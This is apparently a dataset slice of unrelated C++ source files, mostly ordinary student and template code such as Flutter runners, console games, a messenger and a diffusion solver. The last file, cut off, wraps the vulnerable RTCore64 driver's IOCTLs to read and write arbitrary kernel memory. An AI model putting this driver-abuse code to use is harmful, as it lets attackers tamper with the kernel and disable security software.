str_fields_separator;\n\tstr_formatted_client_data_line += to_string(client_s.d_account_balance) + str_fields_separator;\n\treturn (str_formatted_client_data_line);\n}\n\nvoid\tft_update_clients_file(vector <s_client> v_clients_s, string str_filename = CLIENTS_FILENAME, string str_fields_separator = \"#//#\")\n{\n\tfstream\tfile_of_clients;\n\n\tfile_of_clients.open(str_filename, ios::out | ios::trunc);\n\tif (file_of_clients.is_open())\n\t{\n\t\tfor (s_client &client_s : v_clients_s)\n\t\t\tfile_of_clients << ft_get_formatted_line_from_client_data(client_s) << endl;\n\t\tfile_of_clients.close();\n\t}\n}\n\nvoid\tft_update_client_by_acc_nbr(string str_acc_nbr, string str_filename = CLIENTS_FILENAME)\n{\n\tvector <s_client>\tv_clients_s;\n\ts_client\tclient_s;\n\tchar\tconfirm_update;\n\n\tconfirm_update = 'N';\n\tv_clients_s = ft_v_get_clients_from_file(str_filename);\n\tif (ft_search_if_client_exist(str_acc_nbr, client_s))\n\t{\n\t\tft_print_client_data_details(client_s);\n\t\tprintf(\"\\nAre you sure that you want to update this client (Y/N)? \");\n\t\tcin >> confirm_update;\n\t\tif (toupper(confirm_update) == 'Y')\n\t\t{\n\t\t\tfor (s_client &client_s : v_clients_s)\n\t\t\t\tif (client_s.str_id_nbr == str_acc_nbr)\n\t\t\t\t{\n\t\t\t\t\tclient_s = ft_get_",
    "#define BOOST_TEST_DYN_LINK\n#define BOOST_TEST_MODULE ToTEnergyConverterTest\n\n#include \"../ToTEnergyConverter.h\"\n#include \"JPetLoggerInclude.h\"\n#include <boost/test/unit_test.hpp>\nusing namespace jpet_common_tools;\nusing namespace tot_energy_converter;\n\n/// Returns Time-over-threshold for given deposited energy\n/// the current parametrization is par1 + par2 * eDep\n/// Returned value in ps, and eDep is given in keV.\ndouble getToT1(double eDep, double par1 = -91958, double par2 = 19341)\n{\n  if (eDep < 0)\n    return 0;\n  double value = par1 + eDep * par2;\n  return value;\n}\n\nBOOST_AUTO_TEST_SUITE(ToTConverterTestSuite)\n\nBOOST_AUTO_TEST_CASE(getTot_standardFunc)\n{\n  JPetCachedFunctionParams params(\"pol1\", {-91958, 19341});\n  ToTEnergyConverter conv(params, Range(10000, 0., 100.));\n  BOOST_CHECK_CLOSE(conv(0), getToT1(0), 0.1);\n  BOOST_CHECK_CLOSE(conv(1), getToT1(1), 0.1);\n  BOOST_CHECK_CLOSE(conv(10), getToT1(10), 0.1);\n  BOOST_CHECK_CLOSE(conv(59.5), getToT1(59.5), 0.1);\n  BOOST_CHECK_CLOSE(conv(99.9), getToT1(99.9), 0.1);\n}\n\nBOOST_AUTO_TEST_SUITE_END()\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"calculator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <fstream>\n\nusing namespace std;\n\nnamespace\n{\n    constexpr int I = 20;\n    constexpr int J = 30;\n    constexpr int K = 40;\n    const double D = 1.0;\n    const double h1 = 1.0, h2 = 1.0, h3 = 1.0;\n    const double tau = 0.01;\n\n    void read_file(double data[I * J * K])\n    {\n        ifstream fin(\"input.raw\", ios_base::binary);\n        fin.read((char*)&data[0], sizeof(double) * I * J * K);\n        fin.close();\n    }\n\n    void write_file(double data[I * J * K])\n    {\n        ofstream fout(\"output_1d.raw\", ios_base::binary);\n        fout.write((char*)&data[0], sizeof(double) * I * J * K);\n        fout.close();\n    }\n\n    void copy(double arr_adress[I * J * K], double arr_source[I * J * K])\n    {\n        for (int i = 0; i < I; ++i)\n        {\n            for (int j = 0; j < J; ++j)\n            {\n                for (int k = 0; k < K; ++k)\n                {\n                    arr_adress[i * K * J + j * K + k] = arr_source[i * K * J + j * K + k];\n                }\n            }\n        }\n\n    }\n}\n\nvoid array1D()\n{\n    double data[I * J * K] = { 0 };\n    double temp[I * J * K] = { 0 };\n\n    read_file(data);\n\n    for (int n = 0; n < 100; ++n)\n    {\n        for (int i = 1; i < I - 1; ++i)\n        {\n            for (int j = 1; j < J - 1; ++j)\n            {\n                for (int k = 1; k < K - 1; ++k)\n                {\n                    const double part1 = (data[(i + 1) * K * J + j * K + k] - 2.0 * data[i * K * J + j * K + k] + data[(i - 1) * K * J + j * K + k]) / (h1 * h1);\n                    const double part2 = (data[i * K * J + (j + 1) * K + k] - 2.0 * data[i * K * J + j * K + k] + data[i * K * J + (j - 1) * K + k]) / (h2 * h2);\n                    const double part3 = (data[i * K * J + j * K + (k + 1)] - 2.0 * data[i * K * J + j * K + k] + data[i * K * J + j * K + (k - 1)]) / (h3 * h3);\n                    temp[i * K * J + j * K + k] = D * tau * (part1 + part2 + part3) + data[i * K * J + j * K + k];\n                }\n            }\n        }\n        memcpy(&data[0], &temp[0], I * J * K * sizeof(double));\n    }\n\n    write_file(data);\n}",
    "#include<iostream>\n#include<map>\n#include<vector>\n#include<algorithm>\n#include<stdio.h>\n#include<string>\n#include<string.h>\n#include<stdlib.h>\nusing namespace std;\n\nvoid page1();\nvoid page2(string);\n\nmap<string,string> user;\nvector<string> v;\nvector<string> num;\nmap<string,string> list;\n\nclass frnd\n{\n    vector<string> flist;  \n    vector<string> number;\n    struct chat\n    {\n    int message_id;\n    string sender,receiver;\n    char mess[50][100];\n    int num_of_message=0;\n    };\n\n    public:\n    map<string,chat> sms;       \n    void add_frnd(string);\n    void un_frnd(string);\n    void disp_frnd(string);\n    void chat_on(string,string,char*);\n    void inbox(string,string);\n};\n\nvoid frnd::chat_on(string uname,string reciepient,char *message)\n{\n    vector<string>::iterator iv;\n    int flag=0;\n    sms[reciepient].sender=uname;\n    sms[reciepient].receiver=reciepient;\n    map<string,string>::iterator iuser;\n    for(iv=v.begin();iv!=v.end();iv++)\n        {\n          if(*iv==reciepient)\n          {\n            flag++;\n          }\n        }\n\n      if(!flag)\n      {\n        cout<<\"\\nSorry!! No user found\\a\\a\\n\";\n        page2(uname);\n      }\n\n    int i;\n    char cuname[30];\n    for(i=0;uname[i]!='\\0';i++)\n    cuname[i]=uname[i];\n\n    strcpy(sms[reciepient].mess[sms[reciepient].num_of_message],cuname);\n    strcat(sms[reciepient].mess[sms[reciepient].num_of_message],\":  \");\n    strcat(sms[reciepient].mess[sms[reciepient].num_of_message],message);\n    sms[reciepient].num_of_message++;\n    cout<<sms[reciepient].mess[sms[reciepient].num_of_message];\n    //cout<<sms[reciepient].num_of_message;\n}\n\n\nvoid frnd::inbox(string uname,string reciepient)\n{\n  cout<<\"\\nWelcome \"<<uname<<\" to your Inbox\\n\\n\";\n  cout<<\"All Messages in your Inbox:\\n\\n\";\n  for(auto iuser: sms)\n  cout<<iuser.first<<\" \"<<iuser.second.mess[sms[reciepient].num_of_message]<<endl;\n\n}\n    \nvoid frnd::add_frnd(string uname)\n{\n    vector<string>::iterator iv;\n    map<string,string>::iterator iuser;\n    //struct chat C1;\n    int uflag=0,flag=0,flag3=0;\n    string addname;\n    string pnumber;\n    cout<<\"ENTER PHONE NUMBER:  \";\n    cin>>pnumber;\n    while(pnumber.size()!=10)\n    {\n      cout<<\"ENTER VALID NUMBER  :\";\n      cin>>pnumber;\n    }\n    cout<<\"\\nENTER NAME:  \";\n    cin>>addname;\n    cout<<\"\\nPlease wait! checking for  \"<<addname<<\"......\\n\";\n    // waiting time for new mwssage\n    for(long int i=0;i<99999999;)\n    i++;\n\n    for(iuser=user.begin();iuser!=user.end();iuser++)\n    {\n        for(iv=flist.begin();iv!=flist.end();iv++)\n         {\n            if(*iv==addname)\n            flag3++;\n         }\n\n        if(addname==uname)\n         {\n            uflag++;\n            break;\n         }\n\n        else if(iuser->first==addname)\n        flag++;\n    }\n\n        //error for trying to add yourself as your friend\n        if(uflag==1)\n        cout<<\"\\nSorry! Can't add yourself to your friend list\\n\";\n\n        if(flag3==1)\n        cout<<\"\\n\"<<addname<<\" already exists in your friend list\\n\";\n\n        if(flag==0 && uflag==0 && flag3==0)\n        {\n         flist.push_back(addname);\n         number.push_back(pnumber);\n         v=flist;\n         num=number;\n         list[addname]=pnumber;\n         cout<<\"\\nCongratulations! \"<<addname<<\" has been added to your friend list\\n\"<<endl;\n        }\n\n}\n\nvoid frnd::disp_frnd(string uname)\n{\n    int c=0;\n    //vector<string>::iterator it;\n    cout<<\"\\nWelcome \"<<uname<<\" Your Friends are:\"<<endl<<endl<<endl;\n    cout<<\"Name \"<<\"     \"<<\"Ph. Number\"<<endl;\n    for(auto &it:list)\n    {\n      cout<<\"\\n\"<<it.first<<\"     \"<<\"91-\"<<it.second;\n      c++;\n    }\n    cout<<endl<<endl<<\"\\nTotal friends: \"<<c;\n}\n\nvoid frnd::un_frnd(string uname)\n{\n    if(flist.empty())\n    {\n        cout<<\"\\nFriend list empty..!!\\a\\n\";\n    }\n    else\n  {\n    int c=0,pos=0,flag=0;\n    string name;\n    cout<<\"\\nEnter the friend name you want to unfriend \\n\";\n    cin>>name;\n    vector<string>::iterator i;\n    i=flist.begin();\n\n    for(;i!=flist.end();i++)\n    {\n        c++;\n        if(*i==name)\n        {\n          flag++;\n          pos=c-1;\n          break;\n        }\n    }\n\n    i=flist.begin();\n    if(pos || flag)\n    {\n        cout<<\"\\nRemoving \"<<name<<\" from your friend list..\\a\\a\\a\\a\\n\";\n        flist.erase(i+pos);\n        /*v.erase(i+pos);\n        num.erase(i+pos);*/\n        list.erase(name);\n        cout<<name<<\" has been successfully removed from your friend list\\n\";\n    }\n    if(flag==0 && pos==0)\n    {\n        cout<<\"\\nNo such friend exists in your friend list\\n\";\n    }\n  }\n}\n\nvoid page1()\n{\n    int flag=0,choice;\n    char Uname[30];\n    cout<<\"\\n*********************** WELCOME TO THE V-MESSENGER ***************************\\n\";\n\n    while(1)\n  {\n    cout<<\"\\nDo you want to:\\n  1. Sign_up\\n  2. Sign_in\\n  3. Exit \\nPlease enter your choice(1/2/3): \";\n    cin>>choice;\n\n    switch(choice)\n {\n    case 1:\n      {\n        string username,pwd;\n\t\t    cout<<\"\\t\\t\\t\\t\\t______Signup______\\n\";\n        cout<<\"\\nEnter your name:\\n\";\n        cin.ignore();\n        c",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include \"MisFunciones.h\"\r\n#include \"Juego.h\"\r\n#include \"simulado.h\"\r\n#include \"Windows.h\"\r\n\r\n\r\nusing namespace std;\r\n\r\nint main() {\r\n    system (\"color 2\");\r\n    int opcion, limite = 6, contadorRondas, puntaje, puntajeAnterior = 0, maximoPuntaje = 0, sumaPuntoTres = 0;\r\n    int puntajeJugador1, puntajeJugador2;\r\n    string nombreDelGanador;\r\n    bool hayEscalera = false, jugadorGano, reseteoSeis = true, dadosIguales = true;\r\n    const int tam = 6;\r\n    int dados[6]; // Declaracion de dados vectores\r\n    string nombre, nombreJugador1, nombreJugador2;\r\n    srand(time(NULL)); // La semilla de los numeros aleatorios. Siempre se setea 1 sola vez y en el MAIN\r\n\r\n    // Inicializo los dados en 0.\r\n    ponerCero(dados, tam);\r\n\r\n    // Voy a armar ac\u00e1 el MEN\u00da PRINCIPAL del juego.\r\n    do {\r\n        contadorRondas = 1;\r\n        jugadorGano = false; // Bandera para verificar si el jugador gano. Se pone en false en cada inicio de ciclo.\r\n\r\n        mostrarMenu();\r\n        cin >> opcion;\r\n\r\n        switch (opcion) {\r\n            case 1:\r\n                cout << \"Ingrese su nombre: \";\r\n                cin.ignore();\r\n                getline(cin, nombre);\r\n\r\n                puntajeJugador1 = 0;\r\n\r\n                while (puntajeJugador1 < 100) {\r\n                        puntajeAnterior=0;\r\n                    for (int i = 1; i <= 3; i++) {\r\n                        cargarAleatorio(dados, tam, limite);\r\n                        puntaje = sumarVector(dados, tam);\r\n                        reseteoSeis = hayReseteo(dados, tam);\r\n                        if (reseteoSeis) {\r\n                            puntaje = 0;\r\n                            puntajeAnterior = 0;\r\n                            puntajeJugador1 = 0;\r\n                        }\r\n                        cout << endl;\r\n                        cout << \"Jugador: \" << nombre << endl;\r\n                        cout << \"Puntaje hasta el momento: \" << puntajeJugador1 << endl;\r\n                        cout << \"Ronda numero #\" << contadorRondas << endl;\r\n                        cout << \"Tirada \" << i << \"/3\" << endl;\r\n                        cout << endl;\r\n                        mostrarDados(dados, tam);\r\n                        hayEscalera = escalera(dados, tam);\r\n                        if (hayEscalera) {\r\n                            cout << endl;\r\n                            cout << \"************************************************\" << endl;\r\n                            cout << \"   GANASTE!!!!!! Escalera servida!!! =D     \" << endl;\r\n                            cout << \"      El jugador \" << nombre << \" ha ganado!   \" << endl;\r\n                            cout << \"************************************************\" << endl;\r\n                            cout << \"Regresando al men\u00fa principal...\" << endl;\r\n                            system(\"pause\");\r\n                            jugadorGano = true;\r\n                            break;\r\n                        }\r\n\r\n                        dadosIguales = mismosDados(dados, tam);\r\n                        if (dadosIguales) {\r\n                            puntaje = dados[1] * 10;\r\n                        }\r\n                        cout << \"El puntaje de esta tirada fue de: \" << puntaje << endl;\r\n                        if (puntaje > puntajeAnterior) {\r\n                            puntajeAnterior = puntaje;\r\n                            maximoPuntaje = puntaje;\r\n                        } else {\r\n                            maximoPuntaje = puntajeAnterior;\r\n                        }\r\n\r\n                        cout << endl;\r\n                        pausarConMensaje(\"\");\r\n                    }\r\n                    system(\"cls\");\r\n                    if (jugadorGano) {\r\n                        break;\r\n                    }\r\n                    cout << endl;\r\n                    cout << \"El mejor puntaje de las 3 tiradas fue: \" << maximoPuntaje << endl;\r\n                    cout << \"_____________________________________________________________________________________\" << endl;\r\n                    contadorRondas++;\r\n                    puntajeJugador1 += maximoPuntaje;\r\n                }\r\n                cout << endl;\r\n                if (!jugadorGano) {\r\n                    cout << nombre << \", has ganado la partida en \" << contadorRondas - 1 << \" rondas!!! FELICITACIONES!!! =)\" << endl;\r\n                    cout << endl;\r\n                    if(puntajeJugador1>sumaPuntoTres)\r\n                    {\r\n                        sumaPuntoTres = puntajeJugador1;\r\n                        nombreDelGanador = nombre;\r\n                    }\r\n\r\n                    cout << \"El total de puntos acumulados es: \" << puntajeJugador1 << endl;\r\n                    cout << \"La puntuacion mas alta fue: \" << sumaPuntoTres << \" realizada por \" << nombreDelGanador << endl;\r\n                    system(\"pause\");\r\n                }\r\n                break;\r\n\r\n            case 2:\r\n                cout << \"Ingrese nombr",
    "/*\n * Project: TFT Touch Display with Rotary Encoder and Sublist Menu\n * Author: Varad Chaskar\n * Date: 16-Sep-2024\n *\n * Description:\n * This project uses a TFT display with touch capabilities to create a list-based menu\n * system. A rotary encoder is used to navigate between menu items, and a button selects\n * the highlighted item. When a list item is selected, a sublist is shown with additional \n * items. The project also utilizes LittlevGL (lvgl) for creating and managing the graphical\n * user interface (GUI). A button press is used to navigate into submenus, and the encoder \n * helps in selecting items from both the list and sublist.\n *\n * Required Libraries:\n * 1. Arduino.h (for core functions)\n * 2. FS.h (for file system functions)\n * 3. SPI.h (for communication with the TFT display)\n * 4. lvgl.h (for managing the GUI)\n * 5. TFT_eSPI.h (for controlling the TFT display)\n */\n\n#include <Arduino.h>\n#include <FS.h>\n#include <SPI.h>\n#include <lvgl.h>\n#include <TFT_eSPI.h>\n\n// Pin definitions\n#define TOUCH_CS 21           // Pin for touch screen chip select\n#define BUTTON_PIN_1 12       // Pin for button 1 (not used in this code)\n#define BUTTON_PIN_2 32       // Pin for button to select highlighted items\n#define BUZZER_PIN 13         // Pin for buzzer (not used in this code)\n#define CALIBRATION_FILE \"/TouchCalData3\" // File to store touch screen calibration data\n#define REPEAT_CAL true       // Force calibration on every start if set to true\n#define LVGL_REFRESH_TIME 20u // Refresh rate for the LittlevGL GUI in milliseconds\n#define outputA 25            // Pin A for rotary encoder\n#define outputB 33            // Pin B for rotary encoder\n\n// Variables for rotary encoder\nint counter = 0;              // Tracks current position in the list\nint aState;                   // Current state of encoder pin A\nint aLastState;               // Previous state of encoder pin A\nint list_size = 5;            // Total number of items in the main list\nint sublist_size = 4;         // Total number of items in the sublist (including \"Return\")\nint sublist_counter = 0;      // Tracks the current position in the sublist\nbool showing_sublist = false; // Flag to indicate if a sublist is being shown\nunsigned long lastPressTime = 0;          // Time of the last button press\nconst unsigned long debounceDelay = 300;  // Debounce delay for the button in milliseconds\n\n// TFT display and lvgl setup\nTFT_eSPI tft = TFT_eSPI();                  // Create an instance of the TFT_eSPI class for the display\nstatic const uint32_t screenWidth = 320;     // Width of the screen\nstatic const uint32_t screenHeight = 240;    // Height of the screen\nstatic lv_disp_draw_buf_t draw_buf;          // Buffer for drawing on the screen\nstatic lv_color_t buf[screenWidth * 10];     // Buffer size for display\nstatic lv_style_t style_default, style_selected; // GUI styles for default and selected items\nlv_obj_t *label;                            // Pointer for the label widget\nlv_obj_t *list;                             // Pointer for the main list widget\nlv_obj_t *list_items[5];                    // Array to store list items (5 in total)\nlv_obj_t *sublist;                          // Pointer for the sublist widget\nlv_obj_t *sublist_items[4];                 // Array to store sublist items (4 in total)\n\n// Function declarations\nvoid touch_calibrate();                     // Function to calibrate the touch screen\nvoid lvgl_port_tp_read(lv_indev_drv_t *indev, lv_indev_data_t *data); // Function to read touch screen input\nvoid my_disp_flush(lv_disp_drv_t *disp, const lv_area_t *area, lv_color_t *color_p); // Function to update display with lvgl buffer\nstatic void list_event_handler(lv_event_t *e); // Function to handle events in the main list\nstatic void sublist_event_handler(lv_event_t *e); // Function to handle events in the sublist\nvoid lv_example_list(void);                 // Function to create the main list\nvoid lv_create_sublist(int parent_item);    // Function to create the sublist based on the selected parent item\nvoid lv_remove_sublist();                   // Function to remove the sublist from the screen\nvoid handle_encoder_list();                 // Function to handle rotary encoder navigation for the main list\nvoid handle_encoder_sublist();              // Function to handle rotary encoder navigation for the sublist\nvoid handle_button_press();                 // Function to handle the button press for selecting items\n\n// Calibrate the touch screen and store calibration data in SPIFFS\nvoid touch_calibrate() {\n  uint16_t calData[5];      // Array to hold calibration data\n  uint8_t calDataOK = 0;    // Flag to check if calibration data exists\n\n  // Start SPIFFS (SPI Flash File System)\n  if (!SPIFFS.begin()) {\n    Serial.println(\"Formatting file system\");\n    SPIFFS.format();        // Format if there's an error\n    SPIFFS.begin();         // Restart SPIFFS\n  }\n\n  // Check if calibration data already exists in the file\n  if (SPIFFS.exists(CALIBRATION_FILE)",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"first_project\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"basketball_points_counter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// ConsoleApplication12.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <vector>\nusing namespace std;\n\nvoid imprime(vector<int> v) \n{\n    for (auto elemento : v) \n    {\n        cout << elemento << \" , \";\n    }\n    cout << endl;\n    system(\"pause\");\n    system(\"cls\");\n}\n\nint main()\n{\n    vector<int> v;\n\n    //llenar el vector con 0, cinco veces\n    v.assign(5, 0);\n    imprime(v);\n\n\n    // inserta 15 en la ultima posicion\n    v.push_back(15);\n    imprime(v);\n\n    // quita el ultimo elemnto \n    v.pop_back();\n    imprime(v);\n\n    // inserta al principio 5 en el vector\n    v.insert(v.begin(), 5);\n    imprime(v);\n    // borra el primer elemento del vector\n    v.erase(v.begin());\n    imprime(v);\n\n    // emplace() inserta 25 al principio\n    v.emplace(v.begin(), 25);\n    imprime(v);\n\n    // emplace_back() inserta 20 al final\n    v.emplace_back(20);\n\n    // borrar completamente el vector\n    v.clear();\n    imprime(v);\n\n    // swap entre dos vectores\n    vector<int> v1, v2;\n    v1.push_back(1);\n    v1.push_back(2);\n    v2.push_back(3);\n    v2.push_back(4);\n    v1.swap(v2);\n    imprime(v1);\n    imprime(v2);\n}\n",
    "#include \"RecruitDB.h\"\n#include <iostream>\n#include <fstream>\n\nusing namespace std;\n\nint main() \n{\n    RecruitDB recruitDb;\n    ifstream inputFile(\"top100.txt\");\n\n    if (!inputFile.is_open()) \n    {\n        cout << \"Error: Could not open top100.txt!\" << endl;\n        return 1;\n    }\n\n    // reads the recruits\n    recruitDb.read_txt(inputFile);\n    inputFile.close();\n\n    // debugging... \n    cout << \"File read successfully!\" << endl;\n    cout << \"Number of recruits loaded: \" << recruitDb.getRecruitCount() << endl;\n\n    // loop for display menu\n    int choice;\n    string input1, input2;\n    while (true) \n    {\n        // display menu\n        cout << \"Choose an option to search by:\\n\";\n        cout << \"1. Search by State\\n\";\n        cout << \"2. Search by Position\\n\";\n        cout << \"3. Search by Stars and State\\n\";\n        cout << \"4. Search by City and Highschool\\n\";\n        cout << \"5. Exit\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) \n        {\n            case 1:\n                cout << \"Enter State (e.g., AR): \";\n                cin >> input1;\n                recruitDb.searchState(input1);\n                break;\n            case 2:\n                cout << \"Enter Position (e.g., PF): \";\n                cin >> input1;\n                recruitDb.searchPosition(input1);\n                break;\n            case 3:\n                int stars;\n                cout << \"Enter number of stars (e.g., 5): \";\n                cin >> stars;\n                cout << \"Enter State (e.g., TX): \";\n                cin >> input1;\n                recruitDb.searchStarsAndState(stars, input1);\n                break;\n            case 4:\n                cout << \"Enter City (e.g., Miami): \";\n                cin >> ws; \n                getline(cin, input1);\n                cout << \"Enter Highschool:\";\n                getline(cin, input2);\n                recruitDb.searchCityAndHighschool(input1, input2);\n                break;\n            case 5:\n                cout << \"Exiting program.\" << endl;\n                return 0;\n            default:\n                cout << \"Invalid choice. Please try again.\" << endl;\n        }\n    }\n}\n",
    "#include \"../client.h\"\n#include \"clrt.h\"\n\ntypedef struct\n{\n\tQWORD gap1;          // 0x00\n\tQWORD address;       // 0x08\n\tDWORD gap2;          // 0x10\n\tDWORD offset;        // 0x14\n\tDWORD size;          // 0x18\n\tDWORD data;          // 0x1C\n\tuint8_t gap3[16];    // 0x20\n} IO_STRUCT ;\n\nstatic DWORD rt_read_i32(HANDLE driver_handle, QWORD address)\n{\n\tIO_STRUCT operation{};\n\toperation.address = address;\n\toperation.size = sizeof(DWORD);\n\tif (!DeviceIoControl(driver_handle, 0x80002048, &operation,\n\t\tsizeof(operation), &operation, sizeof(operation), NULL, NULL))\n\t{\n\t\treturn 0;\n\t}\n\treturn operation.data;\n}\n\nstatic WORD rt_read_i16(HANDLE driver_handle, QWORD address)\n{\n\tIO_STRUCT operation{};\n\toperation.address = address;\n\toperation.size = sizeof(WORD);\n\tif (!DeviceIoControl(driver_handle, 0x80002048, &operation,\n\t\tsizeof(operation), &operation, sizeof(operation), NULL, NULL))\n\t{\n\t\treturn 0;\n\t}\n\treturn operation.data & 0xFFFF;\n}\n\nstatic BYTE rt_read_i8(HANDLE driver_handle, QWORD address)\n{\n\tIO_STRUCT operation{};\n\toperation.address = address;\n\toperation.size = sizeof(BYTE);\n\tif (!DeviceIoControl(driver_handle, 0x80002048, &operation,\n\t\tsizeof(operation), &operation, sizeof(operation), NULL, NULL))\n\t{\n\t\treturn 0;\n\t}\n\treturn operation.data & 0xFF;\n}\n\nBOOL rt_write_i8(HANDLE driver_handle, QWORD address, BYTE value)\n{\n\tIO_STRUCT operation{};\n\toperation.address = address;\n\toperation.size = sizeof(value);\n\toperation.data = value;\n\treturn DeviceIoControl(driver_handle, 0x8000204C, &operation,\n\t\tsizeof(operation), &operation, sizeof(operation), NULL, NULL);\n}\n\nBOOL rt_write_i16(HANDLE driver_handle, QWORD address, WORD value)\n{\n\tIO_STRUCT operation{};\n\toperation.address = address;\n\toperation.size = sizeof(value);\n\toperation.data = value;\n\treturn DeviceIoControl(driver_handle, 0x8000204C, &operation,\n\t\tsizeof(operation), &operation, sizeof(operation), NULL, NULL);\n}\n\nBOOL rt_write_i32(HANDLE driver_handle, QWORD address, DWORD value)\n{\n\tIO_STRUCT operation{};\n\toperation.address = address;\n\toperation.size = sizeof(value);\n\toperation.data = value;\n\treturn DeviceIoControl(driver_handle, 0x8000204C, &operation,\n\t\tsizeof(operation), &operation, sizeof(operation), NULL, NULL);\n}\n\nstatic BOOL rt_read(HANDLE driver_handle, QWORD address, PVOID buffer, QWORD size)\n{\n\tQWORD offset    = 0;\n\tQWORD data_left = size;\n\n\twhile (data_left)\n\t{\n\t\tif (data_left >= 4)\n\t\t{\n\t\t\tDWORD data = rt_read_i32(driver_handle, address + offset);\n\t\t\t*(DWORD*)((PBYTE)buffer + offset) = data;\n\t\t\toffset += 4;\n\t\t}\n\t\telse if (data_left >= 2)\n\t\t{\n\t\t\tWORD data = rt_read_i16(driver_handle, address + offset);\n\t\t\t*(WORD*)((PBYTE)buffer + offset) = data;\n\t\t\toffset += 2;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tBYTE data = rt_read_i8(driver_handle, address + offset);\n\t\t\t*(BYTE*)((PBYTE)buffer + offset) = data;\n\t\t\toffset += 1;\n\t\t}\n\t\tdata_left = size - offset;\n\t}\n\treturn 1;\n}\n\nstatic BOOL rt_write(HANDLE driver_handle, QWORD address, PVOID buffer, QWORD size)\n{\n\tQWORD offset    = 0;\n\tQWORD data_left = size;\n\n\twhile (data_left)\n\t{\n\t\tif (data_left >= 4)\n\t\t{\n\t\t\trt_write_i32(driver_handle, address + offset, *(DWORD*)((PBYTE)buffer + offset));\n\t\t\toffset += 4;\n\t\t}\n\t\telse if (data_left >= 2)\n\t\t{\n\t\t\trt_write_i16(driver_handle, address + offset, *(WORD*)((PBYTE)buffer + offset));\n\t\t\toffset += 2;\n\t\t}\n\t\telse\n\t\t{\n\t\t\trt_write_i8(driver_handle, address + offset, *(BYTE*)((PBYTE)buffer + offset));\n\t\t\toffset += 1;\n\t\t}\n\t\tdata_left = size - offset;\n\t}\n\treturn 1;\n}\n\nBOOL cl::clrt::initialize(void)\n{\n\tif (driver_handle != 0)\n\t{\n\t\treturn 1;\n\t}\n\n\tdriver_handle = CreateFileA(\"\\\\\\\\.\\\\RTCore64\", GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);\n\tif (driver_handle == INVALID_HANDLE_VALUE)\n\t{\n\t\tdriver_handle = 0;\n\t}\n\n\treturn driver_handle != 0;\n}\n\nBOOL cl::clrt::read_kernel(QWORD address, PVOID buffer, QWORD length)\n{\n\treturn rt_read(driver_handle, address, buffer, length);\n}\n\nBOOL cl::clrt::write_kernel(QWORD address, PVOID 